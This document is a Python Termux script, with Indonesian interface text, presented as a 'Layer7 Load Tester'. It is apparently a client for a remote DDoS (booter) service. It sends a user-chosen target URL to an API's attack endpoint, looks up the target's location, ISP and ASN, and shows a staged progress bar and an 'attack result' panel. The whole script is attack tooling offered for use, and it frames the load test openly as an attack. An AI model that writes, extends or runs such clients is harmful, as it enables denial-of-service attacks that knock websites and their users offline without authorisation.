import os
import time
import requests
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress

console = Console()

def show_banner():
    console.clear()
    console.print(Panel.fit("""
    █▀▀ █▀█ █▀▀ ▀█▀ █▀▀ █▄░█ █▀▀ ▀█▀ █░█ █▀▀
    █▄▄ █▀▀ ██▄ ░█░ ██▄ █░▀█ █▄▄ ░█░ █▄█ █▄█
    """, style="bold magenta"))
    console.print(Panel.fit("Layer7 Load Tester v3.0 - Termux Client", 
                          style="bold yellow", padding=(1,2)))

def start_attack(api_url, target):
    try:
        with console.status("[bold green]Menginisiasi serangan...", spinner="dots12"):
            # Dapatkan info target
            info = requests.get(f"{api_url}/info?target={target}").json()
            
            # Mulai serangan
            response = requests.post(
                f"{api_url}/attack",
                json={"target": target, "apiKey": "TERMUX_KEY"}
            )
            
            if response.status_code != 200:
                console.print(f"[red]Error: {response.json()['error']}")
                return None
            
            return info
    except Exception as e:
        console.print(f"[red]Koneksi gagal: {str(e)}")
        return None

def show_result(info):
    table = Table.grid(expand=True)
    table.add_column(style="cyan", width=20)
    table.add_column(style="magenta")
    
    table.add_row("Target", info['query'])
    table.add_row("Lokasi", f"{info['city']}, {info['country']}")
    table.add_row("ISP", info['isp'])
    table.add_row("Organisasi", info['org'])
    table.add_row("ASN", f"{info['as']}")
    table.add_row("Zona Waktu", info['timezone'])
    table.add_row("Koordinat", f"Lat: {info['lat']}, Lon: {info['lon']}")
    table.add_row("Status", "[bold green]BERHASIL[/]")
    
    console.print(Panel.fit(table, 
                         title="[bold yellow]Hasil Serangan", 
                         subtitle="[green]Serangan selesai dalam 60 detik",
                         style="bold white"))

def main():
    show_banner()
    api_url = console.input("[bold cyan]\[?][/] Masukan API URL: ")
    
    show_banner()
    target = console.input("[bold cyan]\[?][/] Masukan target URL: ")
    
    show_banner()
    with Progress(transient=True) as progress:
        task = progress.add_task("[red]Memulai serangan...", total=100)
        
        info = start_attack(api_url, target)
        if not info:
            return
        
        for i in range(100):
            progress.update(task, advance=1, 
                          description=f"[yellow]Status serangan ({i+1}%)")
            time.sleep(0.6)
    
    show_banner()
    show_result(info)

if __name__ == "__main__":
    main()
